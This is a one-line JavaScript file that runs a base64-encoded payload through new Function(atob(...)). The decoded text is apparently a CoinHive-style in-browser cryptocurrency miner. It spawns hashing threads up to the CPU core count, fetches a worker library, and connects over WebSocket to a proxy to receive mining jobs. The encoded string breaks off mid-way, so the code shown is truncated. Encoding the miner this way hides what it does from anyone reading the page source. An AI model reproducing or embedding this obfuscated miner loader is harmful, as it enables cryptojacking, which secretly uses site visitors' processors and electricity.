new Function(atob("dmFyIHVybCA9IG51bGw7CnZhciBzY3JpcHRUYWcgPSBBcnJheS5wcm90b3R5cGUuc2xpY2UKICAuY2FsbChkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgic2NyaXB0IikpCiAgLmZpbHRlcih4ID0+IC9cL2NsaWVudFw/cHJveHkkLy50ZXN0KHguc3JjKSk7CmlmIChzY3JpcHRUYWcubGVuZ3RoID4gMCkgewogIHVybCA9IHNjcmlwdFRhZ1swXS5zcmMuc3BsaXQoIi9jbGllbnQiKVswXSArICcvJzsKfSBlbHNlIHsKICB0aHJvdyBuZXcgRXJyb3IoIm1pc3NpbmcgJz9wcm94eScgcXVlcnkgcGFyYW1ldGVyISIpOwp9CihmdW5jdGlvbih3aW5kb3cpIHsKICAidXNlIHN0cmljdCI7CiAgdmFyIE1pbmVyID0gZnVuY3Rpb24oc2l0ZUtleSwgcGFyYW1zKSB7CiAgICB0aGlzLnBhcmFtcyA9IHBhcmFtcyB8fCB7fTsKICAgIHRoaXMuX3NpdGVLZXkgPSBzaXRlS2V5OwogICAgdGhpcy5fdXNlciA9IG51bGw7CiAgICB0aGlzLl90aHJlYWRzID0gW107CiAgICB0aGlzLl9oYXNoZXMgPSAwOwogICAgdGhpcy5fY3VycmVudEpvYiA9IG51bGw7CiAgICB0aGlzLl9hdXRvUmVjb25uZWN0ID0gdHJ1ZTsKICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gMzsKICAgIHRoaXMuX3Rva2VuRnJvbVNlcnZlciA9IG51bGw7CiAgICB0aGlzLl9nb2FsID0gMDsKICAgIHRoaXMuX3RvdGFsSGFzaGVzRnJvbURlYWRUaHJlYWRzID0gMDsKICAgIHRoaXMuX3Rocm90dGxlID0gTWF0aC5tYXgoMCwgTWF0aC5taW4oMC45OSwgdGhpcy5wYXJhbXMudGhyb3R0bGUgfHwgMCkpOwogICAgdGhpcy5fc3RvcE9uSW52YWxpZE9wdEluID0gZmFsc2U7CiAgICB0aGlzLl9hdXRvVGhyZWFkcyA9IHsKICAgICAgZW5hYmxlZDogISF0aGlzLnBhcmFtcy5hdXRvVGhyZWFkcywKICAgICAgaW50ZXJ2YWw6IG51bGwsCiAgICAgIGFkanVzdEF0OiBudWxsLAogICAgICBhZGp1c3RFdmVyeTogMWU0LAogICAgICBzdGF0czoge30KICAgIH07CiAgICB0aGlzLl90YWIgPSB7CiAgICAgIGlkZW50OiAoTWF0aC5yYW5kb20oKSAqIDE2Nzc3MjE1KSB8IDAsCiAgICAgIG1vZGU6IENvaW5IaXZlLklGX0VYQ0xVU0lWRV9UQUIsCiAgICAgIGdyYWNlOiAwLAogICAgICBsYXN0UGluZ1JlY2VpdmVkOiAwLAogICAgICBpbnRlcnZhbDogbnVsbAogICAgfTsKICAgIGlmICh3aW5kb3cuQnJvYWRjYXN0Q2hhbm5lbCkgewogICAgICB0cnkgewogICAgICAgIHRoaXMuX2JjID0gbmV3IEJyb2FkY2FzdENoYW5uZWwoImNvaW5oaXZlIik7CiAgICAgICAgdGhpcy5fYmMub25tZXNzYWdlID0gZnVuY3Rpb24obXNnKSB7CiAgICAgICAgICBpZiAobXNnLmRhdGEgPT09ICJwaW5nIikgewogICAgICAgICAgICB0aGlzLl90YWIubGFzdFBpbmdSZWNlaXZlZCA9IERhdGUubm93KCk7CiAgICAgICAgICB9CiAgICAgICAgfS5iaW5kKHRoaXMpOwogICAgICB9IGNhdGNoIChlKSB7fQogICAgfQogICAgdGhpcy5fZXZlbnRMaXN0ZW5lcnMgPSB7CiAgICAgIG9wZW46IFtdLAogICAgICBhdXRoZWQ6IFtdLAogICAgICBjbG9zZTogW10sCiAgICAgIGVycm9yOiBbXSwKICAgICAgam9iOiBbXSwKICAgICAgZm91bmQ6IFtdLAogICAgICBhY2NlcHRlZDogW10KICAgIH07CiAgICB2YXIgZGVmYXVsdFRocmVhZHMgPSBuYXZpZ2F0b3IuaGFyZHdhcmVDb25jdXJyZW5jeSB8fCA0OwogICAgdGhpcy5fdGFyZ2V0TnVtVGhyZWFkcyA9IHRoaXMucGFyYW1zLnRocmVhZHMgfHwgZGVmYXVsdFRocmVhZHM7CiAgICB0aGlzLl91c2VXQVNNID0gdGhpcy5oYXNXQVNNU3VwcG9ydCgpICYmICF0aGlzLnBhcmFtcy5mb3JjZUFTTUpTOwogICAgdGhpcy5fYXNtanNTdGF0dXMgPSAidW5sb2FkZWQiOwogICAgdGhpcy5fb25UYXJnZXRNZXRCb3VuZCA9IHRoaXMuX29uVGFyZ2V0TWV0LmJpbmQodGhpcyk7CiAgICB0aGlzLl9vblZlcmlmaWVkQm91bmQgPSB0aGlzLl9vblZlcmlmaWVkLmJpbmQodGhpcyk7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuc3RhcnQgPSBmdW5jdGlvbihtb2RlLCBvcHRJblRva2VuKSB7CiAgICB0aGlzLl90YWIubW9kZSA9IG1vZGUgfHwgQ29pbkhpdmUuSUZfRVhDTFVTSVZFX1RBQjsKICAgIHRoaXMuX29wdEluVG9rZW4gPSBvcHRJblRva2VuOwogICAgaWYgKHRoaXMuX3RhYi5pbnRlcnZhbCkgewogICAgICBjbGVhckludGVydmFsKHRoaXMuX3RhYi5pbnRlcnZhbCk7CiAgICAgIHRoaXMuX3RhYi5pbnRlcnZhbCA9IG51bGw7CiAgICB9CiAgICBpZiAodGhpcy5fdXNlV0FTTSB8fCB0aGlzLl9hc21qc1N0YXR1cyA9PT0gImxvYWRlZCIpIHsKICAgICAgdGhpcy5fc3RhcnROb3coKTsKICAgIH0gZWxzZSBpZiAodGhpcy5fYXNtanNTdGF0dXMgPT09ICJ1bmxvYWRlZCIpIHsKICAgICAgdGhpcy5fYXNtanNTdGF0dXMgPSAicGVuZGluZyI7CiAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgeGhyLmFkZEV2ZW50TGlzdGVuZXIoCiAgICAgICAgImxvYWQiLAogICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgQ29pbkhpdmUuQ1JZUFRPTklHSFRfV09SS0VSX0JMT0IgPSB3aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTCgKICAgICAgICAgICAgbmV3IEJsb2IoW3hoci5yZXNwb25zZVRleHRdKQogICAgICAgICAgKTsKICAgICAgICAgIHRoaXMuX2FzbWpzU3RhdHVzID0gImxvYWRlZCI7CiAgICAgICAgICB0aGlzLl9zdGFydE5vdygpOwogICAgICAgIH0uYmluZCh0aGlzKSwKICAgICAgICB4aHIKICAgICAgKTsKICAgICAgeGhyLm9wZW4oCiAgICAgICAgImdldCIsCiAgICAgICAgQ29pbkhpdmUuQ09ORklHLkxJQl9VUkwgKyBDb2luSGl2ZS5DT05GSUcuQVNNSlNfTkFNRSwKICAgICAgICB0cnVlCiAgICAgICk7CiAgICAgIHhoci5zZW5kKCk7CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuc3RvcCA9IGZ1bmN0aW9uKG1vZGUpIHsKICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdGhpcy5fdGhyZWFkcy5sZW5ndGg7IGkrKykgewogICAgICB0aGlzLl90b3RhbEhhc2hlc0Zyb21EZWFkVGhyZWFkcyArPSB0aGlzLl90aHJlYWRzW2ldLmhhc2hlc1RvdGFsOwogICAgICB0aGlzLl90aHJlYWRzW2ldLnN0b3AoKTsKICAgIH0KICAgIHRoaXMuX3RocmVhZHMgPSBbXTsKICAgIHRoaXMuX2F1dG9SZWNvbm5lY3QgPSBmYWxzZTsKICAgIGlmICh0aGlzLl9zb2NrZXQpIHsKICAgICAgdGhpcy5fc29ja2V0LmNsb3NlKCk7CiAgICB9CiAgICB0aGlzLl9jdXJyZW50Sm9iID0gbnVsbDsKICAgIGlmICh0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCkgewogICAgICBjbGVhckludGVydmFsKHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsKTsKICAgICAgdGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwgPSBudWxsOwogICAgfQogICAgaWYgKHRoaXMuX3RhYi5pbnRlcnZhbCAmJiBtb2RlICE9PSAiZG9udEtpbGxUYWJVcGRhdGUiKSB7CiAgICAgIGNsZWFySW50ZXJ2YWwodGhpcy5fdGFiLmludGVydmFsKTsKICAgICAgdGhpcy5fdGFiLmludGVydmFsID0gbnVsbDsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5nZXRIYXNoZXNQZXJTZWNvbmQgPSBmdW5jdGlvbigpIHsKICAgIHZhciBoYXNoZXNQZXJTZWNvbmQgPSAwOwogICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLl90aHJlYWRzLmxlbmd0aDsgaSsrKSB7CiAgICAgIGhhc2hlc1BlclNlY29uZCArPSB0aGlzLl90aHJlYWRzW2ldLmhhc2hlc1BlclNlY29uZDsKICAgIH0KICAgIHJldHVybiBoYXNoZXNQZXJTZWNvbmQ7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuZ2V0VG90YWxIYXNoZXMgPSBmdW5jdGlvbihlc3RpbWF0ZSkgewogICAgdmFyIG5vdyA9IERhdGUubm93KCk7CiAgICB2YXIgaGFzaGVzID0gdGhpcy5fdG90YWxIYXNoZXNGcm9tRGVhZFRocmVhZHM7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgdmFyIHRocmVhZCA9IHRoaXMuX3RocmVhZHNbaV07CiAgICAgIGhhc2hlcyArPSB0aHJlYWQuaGFzaGVzVG90YWw7CiAgICAgIGlmIChlc3RpbWF0ZSkgewogICAgICAgIHZhciB0ZGlmZiA9IChub3cgLSB0aHJlYWQubGFzdE1lc3NhZ2VUaW1lc3RhbXApIC8gMWUzICogMC45OwogICAgICAgIGhhc2hlcyArPSB0ZGlmZiAqIHRocmVhZC5oYXNoZXNQZXJTZWNvbmQ7CiAgICAgIH0KICAgIH0KICAgIHJldHVybiBoYXNoZXMgfCAwOwogIH07CiAgTWluZXIucHJvdG90eXBlLmdldEFjY2VwdGVkSGFzaGVzID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gdGhpcy5faGFzaGVzOwogIH07CiAgTWluZXIucHJvdG90eXBlLmdldFRva2VuID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gdGhpcy5fdG9rZW5Gcm9tU2VydmVyOwogIH07CiAgTWluZXIucHJvdG90eXBlLm9uID0gZnVuY3Rpb24odHlwZSwgY2FsbGJhY2spIHsKICAgIGlmICh0aGlzLl9ldmVudExpc3RlbmVyc1t0eXBlXSkgewogICAgICB0aGlzLl9ldmVudExpc3RlbmVyc1t0eXBlXS5wdXNoKGNhbGxiYWNrKTsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5nZXRBdXRvVGhyZWFkc0VuYWJsZWQgPSBmdW5jdGlvbihlbmFibGVkKSB7CiAgICByZXR1cm4gdGhpcy5fYXV0b1RocmVhZHMuZW5hYmxlZDsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5zZXRBdXRvVGhyZWFkc0VuYWJsZWQgPSBmdW5jdGlvbihlbmFibGVkKSB7CiAgICB0aGlzLl9hdXRvVGhyZWFkcy5lbmFibGVkID0gISFlbmFibGVkOwogICAgaWYgKCFlbmFibGVkICYmIHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsKSB7CiAgICAgIGNsZWFySW50ZXJ2YWwodGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwpOwogICAgICB0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCA9IG51bGw7CiAgICB9CiAgICBpZiAoZW5hYmxlZCAmJiAhdGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwpIHsKICAgICAgdGhpcy5fYXV0b1RocmVhZHMuYWRqdXN0QXQgPSBEYXRlLm5vdygpICsgdGhpcy5fYXV0b1RocmVhZHMuYWRqdXN0RXZlcnk7CiAgICAgIHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsID0gc2V0SW50ZXJ2YWwoCiAgICAgICAgdGhpcy5fYWRqdXN0VGhyZWFkcy5iaW5kKHRoaXMpLAogICAgICAgIDFlMwogICAgICApOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLmdldFRocm90dGxlID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gdGhpcy5fdGhyb3R0bGU7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuc2V0VGhyb3R0bGUgPSBmdW5jdGlvbih0aHJvdHRsZSkgewogICAgdGhpcy5fdGhyb3R0bGUgPSBNYXRoLm1heCgwLCBNYXRoLm1pbigwLjk5LCB0aHJvdHRsZSkpOwogICAgaWYgKHRoaXMuX2N1cnJlbnRKb2IpIHsKICAgICAgdGhpcy5fc2V0Sm9iKHRoaXMuX2N1cnJlbnRKb2IpOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLmdldE51bVRocmVhZHMgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiB0aGlzLl90YXJnZXROdW1UaHJlYWRzOwogIH07CiAgTWluZXIucHJvdG90eXBlLnNldE51bVRocmVhZHMgPSBmdW5jdGlvbihudW0pIHsKICAgIHZhciBudW0gPSBNYXRoLm1heCgxLCBudW0gfCAwKTsKICAgIHRoaXMuX3RhcmdldE51bVRocmVhZHMgPSBudW07CiAgICBpZiAobnVtID4gdGhpcy5fdGhyZWFkcy5sZW5ndGgpIHsKICAgICAgZm9yICh2YXIgaSA9IDA7IG51bSA+IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgICB2YXIgdGhyZWFkID0gbmV3IENvaW5IaXZlLkpvYlRocmVhZCgpOwogICAgICAgIGlmICh0aGlzLl9jdXJyZW50Sm9iKSB7CiAgICAgICAgICB0aHJlYWQuc2V0Sm9iKHRoaXMuX2N1cnJlbnRKb2IsIHRoaXMuX29uVGFyZ2V0TWV0Qm91bmQpOwogICAgICAgIH0KICAgICAgICB0aGlzLl90aHJlYWRzLnB1c2godGhyZWFkKTsKICAgICAgfQogICAgfSBlbHNlIGlmIChudW0gPCB0aGlzLl90aHJlYWRzLmxlbmd0aCkgewogICAgICB3aGlsZSAobnVtIDwgdGhpcy5fdGhyZWFkcy5sZW5ndGgpIHsKICAgICAgICB2YXIgdGhyZWFkID0gdGhpcy5fdGhyZWFkcy5wb3AoKTsKICAgICAgICB0aGlzLl90b3RhbEhhc2hlc0Zyb21EZWFkVGhyZWFkcyArPSB0aHJlYWQuaGFzaGVzVG90YWw7CiAgICAgICAgdGhyZWFkLnN0b3AoKTsKICAgICAgfQogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLmhhc1dBU01TdXBwb3J0ID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gd2luZG93LldlYkFzc2VtYmx5ICE9PSB1bmRlZmluZWQ7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuaXNSdW5uaW5nID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gdGhpcy5fdGhyZWFkcy5sZW5ndGggPiAwOwogIH07CiAgTWluZXIucHJvdG90eXBlLl9zdGFydE5vdyA9IGZ1bmN0aW9uKCkgewogICAgaWYgKHRoaXMuX3RhYi5tb2RlICE9PSBDb2luSGl2ZS5GT1JDRV9NVUxUSV9UQUIgJiYgIXRoaXMuX3RhYi5pbnRlcnZhbCkgewogICAgICB0aGlzLl90YWIuaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbCh0aGlzLl91cGRhdGVUYWJzLmJpbmQodGhpcyksIDFlMyk7CiAgICB9CiAgICBpZiAoCiAgICAgIHRoaXMuX3RhYi5tb2RlID09PSBDb2luSGl2ZS5JRl9FWENMVVNJVkVfVEFCICYmCiAgICAgIHRoaXMuX290aGVyVGFiUnVubmluZygpCiAgICApIHsKICAgICAgcmV0dXJuOwogICAgfQogICAgaWYgKHRoaXMuX3RhYi5tb2RlID09PSBDb2luSGl2ZS5GT1JDRV9FWENMVVNJVkVfVEFCKSB7CiAgICAgIHRoaXMuX3RhYi5ncmFjZSA9IERhdGUubm93KCkgKyAzZTM7CiAgICB9CiAgICBpZiAoIXRoaXMudmVyaWZ5VGhyZWFkKSB7CiAgICAgIHRoaXMudmVyaWZ5VGhyZWFkID0gbmV3IENvaW5IaXZlLkpvYlRocmVhZCgpOwogICAgfQogICAgdGhpcy5zZXROdW1UaHJlYWRzKHRoaXMuX3RhcmdldE51bVRocmVhZHMpOwogICAgdGhpcy5fYXV0b1JlY29ubmVjdCA9IHRydWU7CiAgICBpZiAoQ29pbkhpdmUuQ09ORklHLlJFUVVJUkVTX0FVVEggJiYgIXRoaXMuX29wdEluVG9rZW4pIHsKICAgICAgdGhpcy5fYXV0aCA9CiAgICAgICAgdGhpcy5fYXV0aCB8fAogICAgICAgIG5ldyBDb2luSGl2ZS5BdXRoKHRoaXMuX3NpdGVLZXksIHsKICAgICAgICAgIHRoZW1lOiB0aGlzLnBhcmFtcy50aGVtZSB8fCAibGlnaHQiLAogICAgICAgICAgbGFuZzogdGhpcy5wYXJhbXMubGFuZ3VhZ2UgfHwgImF1dG8iCiAgICAgICAgfSk7CiAgICAgIHRoaXMuX2F1dGguYXV0aCgKICAgICAgICBmdW5jdGlvbih0b2tlbikgewogICAgICAgICAgaWYgKCF0b2tlbikgewogICAgICAgICAgICByZXR1cm4gdGhpcy5fZW1pdCgiZXJyb3IiLCB7IGVycm9yOiAib3B0X2luX2NhbmNlbGVkIiB9KTsKICAgICAgICAgIH0KICAgICAgICAgIHRoaXMuX29wdEluVG9rZW4gPSB0b2tlbjsKICAgICAgICAgIHRoaXMuX2Nvbm5lY3QoKTsKICAgICAgICB9LmJpbmQodGhpcykKICAgICAgKTsKICAgIH0gZWxzZSB7CiAgICAgIHRoaXMuX2Nvbm5lY3QoKTsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5fb3RoZXJUYWJSdW5uaW5nID0gZnVuY3Rpb24oKSB7CiAgICBpZiAodGhpcy5fdGFiLmxhc3RQaW5nUmVjZWl2ZWQgPiBEYXRlLm5vdygpIC0gMTUwMCkgewogICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICAgIHRyeSB7CiAgICAgIHZhciB0ZGpzb24gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiY29pbmhpdmUiKTsKICAgICAgaWYgKHRkanNvbikgewogICAgICAgIHZhciB0ZCA9IEpTT04ucGFyc2UodGRqc29uKTsKICAgICAgICBpZiAodGQuaWRlbnQgIT09IHRoaXMuX3RhYi5pZGVudCAmJiBEYXRlLm5vdygpIC0gdGQudGltZSA8IDE1MDApIHsKICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgfQogICAgfSBjYXRjaCAoZSkge30KICAgIHJldHVybiBmYWxzZTsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5fdXBkYXRlVGFicyA9IGZ1bmN0aW9uKCkgewogICAgdmFyIG90aGVyVGFiUnVubmluZyA9IHRoaXMuX290aGVyVGFiUnVubmluZygpOwogICAgaWYgKG90aGVyVGFiUnVubmluZyAmJiB0aGlzLmlzUnVubmluZygpICYmIERhdGUubm93KCkgPiB0aGlzLl90YWIuZ3JhY2UpIHsKICAgICAgdGhpcy5zdG9wKCJkb250S2lsbFRhYlVwZGF0ZSIpOwogICAgfSBlbHNlIGlmICghb3RoZXJUYWJSdW5uaW5nICYmICF0aGlzLmlzUnVubmluZygpKSB7CiAgICAgIHRoaXMuX3N0YXJ0Tm93KCk7CiAgICB9CiAgICBpZiAodGhpcy5pc1J1bm5pbmcoKSkgewogICAgICBpZiAodGhpcy5fYmMpIHsKICAgICAgICB0aGlzLl9iYy5wb3N0TWVzc2FnZSgicGluZyIpOwogICAgICB9CiAgICAgIHRyeSB7CiAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oCiAgICAgICAgICAiY29pbmhpdmUiLAogICAgICAgICAgSlNPTi5zdHJpbmdpZnkoeyBpZGVudDogdGhpcy5fdGFiLmlkZW50LCB0aW1lOiBEYXRlLm5vdygpIH0pCiAgICAgICAgKTsKICAgICAgfSBjYXRjaCAoZSkge30KICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5fYWRqdXN0VGhyZWFkcyA9IGZ1bmN0aW9uKCkgewogICAgdmFyIGhhc2hlcyA9IHRoaXMuZ2V0SGFzaGVzUGVyU2Vjb25kKCk7CiAgICB2YXIgdGhyZWFkcyA9IHRoaXMuZ2V0TnVtVGhyZWFkcygpOwogICAgdmFyIHN0YXRzID0gdGhpcy5fYXV0b1RocmVhZHMuc3RhdHM7CiAgICBzdGF0c1t0aHJlYWRzXSA9IHN0YXRzW3RocmVhZHNdCiAgICAgID8gc3RhdHNbdGhyZWFkc10gKiAwLjUgKyBoYXNoZXMgKiAwLjUKICAgICAgOiBoYXNoZXM7CiAgICBpZiAoRGF0ZS5ub3coKSA+IHRoaXMuX2F1dG9UaHJlYWRzLmFkanVzdEF0KSB7CiAgICAgIHRoaXMuX2F1dG9UaHJlYWRzLmFkanVzdEF0ID0gRGF0ZS5ub3coKSArIHRoaXMuX2F1dG9UaHJlYWRzLmFkanVzdEV2ZXJ5OwogICAgICB2YXIgY3VyID0gKHN0YXRzW3RocmVhZHNdIHx8IDApIC0gMTsKICAgICAgdmFyIHVwID0gc3RhdHNbdGhyZWFkcyArIDFdIHx8IDA7CiAgICAgIHZhciBkb3duID0gc3RhdHNbdGhyZWFkcyAtIDFdIHx8IDA7CiAgICAgIGlmIChjdXIgPiBkb3duICYmICh1cCA9PT0gMCB8fCB1cCA+IGN1cikgJiYgdGhyZWFkcyA8IDgpIHsKICAgICAgICByZXR1cm4gdGhpcy5zZXROdW1UaHJlYWRzKHRocmVhZHMgKyAxKTsKICAgICAgfSBlbHNlIGlmIChjdXIgPiB1cCAmJiAoIWRvd24gfHwgZG93biA+IGN1cikgJiYgdGhyZWFkcyA+IDEpIHsKICAgICAgICByZXR1cm4gdGhpcy5zZXROdW1UaHJlYWRzKHRocmVhZHMgLSAxKTsKICAgICAgfQogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9lbWl0ID0gZnVuY3Rpb24odHlwZSwgcGFyYW1zKSB7CiAgICB2YXIgbGlzdGVuZXJzID0gdGhpcy5fZXZlbnRMaXN0ZW5lcnNbdHlwZV07CiAgICBpZiAobGlzdGVuZXJzICYmIGxpc3RlbmVycy5sZW5ndGgpIHsKICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBsaXN0ZW5lcnMubGVuZ3RoOyBpKyspIHsKICAgICAgICBsaXN0ZW5lcnNbaV0ocGFyYW1zKTsKICAgICAgfQogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9oYXNoU3RyaW5nID0gZnVuY3Rpb24ocykgewogICAgdmFyIGhhc2ggPSA1MzgxLAogICAgICBpID0gcy5sZW5ndGg7CiAgICB3aGlsZSAoaSkgewogICAgICBoYXNoID0gKGhhc2ggKiAzMykgXiBzLmNoYXJDb2RlQXQoLS1pKTsKICAgIH0KICAgIHJldHVybiBoYXNoID4+PiAwOwogIH07CiAgTWluZXIucHJvdG90eXBlLl9jb25uZWN0ID0gZnVuY3Rpb24oKSB7CiAgICBpZiAodGhpcy5fc29ja2V0KSB7CiAgICAgIHJldHVybjsKICAgIH0KICAgIHZhciBzaGFyZHMgPSBDb2luSGl2ZS5DT05GSUcuV0VCU09DS0VUX1NIQVJEUzsKICAgIHZhciBzaGFyZElkeCA9IHRoaXMuX2hhc2hTdHJpbmcodGhpcy5fc2l0ZUtleSkgJSBzaGFyZHMubGVuZ3RoOwogICAgdmFyIHByb3hpZXMgPSBzaGFyZHNbc2hhcmRJZHhdOwogICAgdmFyIHByb3h5VXJsID0gcHJveGllc1soTWF0aC5yYW5kb20oKSAqIHByb3hpZXMubGVuZ3RoKSB8IDBdOwogICAgdGhpcy5fc29ja2V0ID0gbmV3IFdlYlNvY2tldChwcm94eVVybCk7CiAgICB0aGlzLl9zb2NrZXQub25tZXNzYWdlID0gdGhpcy5fb25NZXNzYWdlLmJpbmQodGhpcyk7CiAgICB0aGlzLl9zb2NrZXQub25lcnJvciA9IHRoaXMuX29uRXJyb3IuYmluZCh0aGlzKTsKICAgIHRoaXMuX3NvY2tldC5vbmNsb3NlID0gdGhpcy5fb25DbG9zZS5iaW5kKHRoaXMpOwogICAgdGhpcy5fc29ja2V0Lm9ub3BlbiA9IHRoaXMuX29uT3Blbi5iaW5kKHRoaXMpOwogIH07CiAgTWluZXIucHJvdG90eXBlLl9vbk9wZW4gPSBmdW5jdGlvbihldikgewogICAgdGhpcy5fZW1pdCgib3BlbiIpOwogICAgdmFyIHBhcmFtcyA9IHsKICAgICAgc2l0ZV9rZXk6IHRoaXMuX3NpdGVLZXksCiAgICAgIHR5cGU6ICJhbm9ueW1vdXMiLAogICAgICB1c2VyOiBudWxsLAogICAgICBnb2FsOiAwCiAgICB9OwogICAgaWYgKHRoaXMuX3VzZXIpIHsKICAgICAgcGFyYW1zLnR5cGUgPSAidXNlciI7CiAgICAgIHBhcmFtcy51c2VyID0gdGhpcy5fdXNlci50b1N0cmluZygpOwogICAgfSBlbHNlIGlmICh0aGlzLl9nb2FsKSB7CiAgICAgIHBhcmFtcy50eXBlID0gInRva2VuIjsKICAgICAgcGFyYW1zLmdvYWwgPSB0aGlzLl9nb2FsOwogICAgfQogICAgaWYgKHRoaXMuX29wdEluVG9rZW4pIHsKICAgICAgcGFyYW1zLm9wdF9pbiA9IHRoaXMuX29wdEluVG9rZW47CiAgICB9CiAgICB0aGlzLl9zZW5kKCJhdXRoIiwgcGFyYW1zKTsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5fb25FcnJvciA9IGZ1bmN0aW9uKGV2KSB7CiAgICB0aGlzLl9lbWl0KCJlcnJvciIsIHsgZXJyb3I6ICJjb25uZWN0aW9uX2Vycm9yIiB9KTsKICAgIHRoaXMuX29uQ2xvc2UoZXYpOwogIH07CiAgTWluZXIucHJvdG90eXBlLl9vbkNsb3NlID0gZnVuY3Rpb24oZXYpIHsKICAgIGlmIChldi5jb2RlID49IDEwMDMgJiYgZXYuY29kZSA8PSAxMDA5KSB7CiAgICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gNjA7CiAgICB9CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgdGhpcy5fdGhyZWFkc1tpXS5zdG9wKCk7CiAgICB9CiAgICB0aGlzLl90aHJlYWRzID0gW107CiAgICB0aGlzLl9zb2NrZXQgPSBudWxsOwogICAgdGhpcy5fZW1pdCgiY2xvc2UiKTsKICAgIGlmICh0aGlzLl9hdXRvUmVjb25uZWN0KSB7CiAgICAgIHNldFRpbWVvdXQodGhpcy5fc3RhcnROb3cuYmluZCh0aGlzKSwgdGhpcy5fcmVjb25uZWN0UmV0cnkgKiAxZTMpOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9vbk1lc3NhZ2UgPSBmdW5jdGlvbihldikgewogICAgdmFyIG1zZyA9IEpTT04ucGFyc2UoZXYuZGF0YSk7CiAgICBpZiAobXNnLnR5cGUgPT09ICJqb2IiKSB7CiAgICAgIHRoaXMuX3NldEpvYihtc2cucGFyYW1zKTsKICAgICAgdGhpcy5fZW1pdCgiam9iIiwgbXNnLnBhcmFtcyk7CiAgICAgIGlmICh0aGlzLl9hdXRvVGhyZWFkcy5lbmFibGVkICYmICF0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCkgewogICAgICAgIHRoaXMuX2F1dG9UaHJlYWRzLmFkanVzdEF0ID0gRGF0ZS5ub3coKSArIHRoaXMuX2F1dG9UaHJlYWRzLmFkanVzdEV2ZXJ5OwogICAgICAgIHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsID0gc2V0SW50ZXJ2YWwoCiAgICAgICAgICB0aGlzLl9hZGp1c3RUaHJlYWRzLmJpbmQodGhpcyksCiAgICAgICAgICAxZTMKICAgICAgICApOwogICAgICB9CiAgICB9IGVsc2UgaWYgKG1zZy50eXBlID09PSAidmVyaWZ5IikgewogICAgICB0aGlzLnZlcmlmeVRocmVhZC52ZXJpZnkobXNnLnBhcmFtcywgdGhpcy5fb25WZXJpZmllZEJvdW5kKTsKICAgIH0gZWxzZSBpZiAobXNnLnR5cGUgPT09ICJoYXNoX2FjY2VwdGVkIikgewogICAgICB0aGlzLl9oYXNoZXMgPSBtc2cucGFyYW1zLmhhc2hlczsKICAgICAgdGhpcy5fZW1pdCgiYWNjZXB0ZWQiLCBtc2cucGFyYW1zKTsKICAgICAgaWYgKHRoaXMuX2dvYWwgJiYgdGhpcy5faGFzaGVzID49IHRoaXMuX2dvYWwpIHsKICAgICAgICB0aGlzLnN0b3AoKTsKICAgICAgfQogICAgfSBlbHNlIGlmIChtc2cudHlwZSA9PT0gImF1dGhlZCIpIHsKICAgICAgdGhpcy5fdG9rZW5Gcm9tU2VydmVyID0gbXNnLnBhcmFtcy50b2tlbiB8fCBudWxsOwogICAgICB0aGlzLl9oYXNoZXMgPSBtc2cucGFyYW1zLmhhc2hlcyB8fCAwOwogICAgICB0aGlzLl9lbWl0KCJhdXRoZWQiLCBtc2cucGFyYW1zKTsKICAgICAgdGhpcy5fcmVjb25uZWN0UmV0cnkgPSAzOwogICAgfSBlbHNlIGlmIChtc2cudHlwZSA9PT0gImVycm9yIikgewogICAgICBpZiAoY29uc29sZSAmJiBjb25zb2xlLmVycm9yKSB7C